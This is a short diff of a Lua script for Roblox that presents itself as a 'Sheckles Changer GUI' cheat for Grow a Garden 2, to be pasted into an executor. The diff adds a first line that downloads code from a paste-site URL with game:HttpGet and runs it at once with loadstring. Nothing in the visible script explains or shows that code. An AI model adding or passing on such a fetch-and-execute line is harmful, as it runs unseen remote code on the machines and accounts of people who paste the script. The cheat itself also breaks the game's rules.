@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/6PC12SMFfj/0"))()
 -- Grow a Garden 2 - Sheckles Changer GUI (Redesigned)
 -- Paste this into your executor
 
